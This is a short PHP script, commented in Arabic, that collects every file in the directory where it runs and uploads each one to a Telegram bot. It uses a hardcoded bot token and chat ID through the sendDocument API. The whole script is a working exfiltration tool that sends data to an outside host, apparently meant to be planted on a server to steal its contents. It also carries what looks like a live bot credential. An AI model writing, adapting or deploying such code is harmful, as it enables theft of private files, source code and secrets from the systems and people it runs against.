<?php
$botToken = '6476951548:AAFD5fW4VtLguI4D0QnwyPUaFSWILiQSiJo';
$chatId = '5954268142';

// استخدم glob() للعثور على جميع الملفات في الدليل الحالي.
$files = glob('*');

foreach ($files as $file) {
    if (is_file($file)) {
        // إنشاء رسالة مع الملف المرفق.
        $postFields = [
            'chat_id' => $chatId,
            'document' => new CURLFile(realpath($file)),
        ];

        // أرسل الرسالة إلى البوت باستخدام طلب POST.
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$botToken/sendDocument");
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        curl_close($ch);
        
        // يمكنك إضافة مزيد من المعالجة هنا حسب احتياجاتك.
    }
}
?>
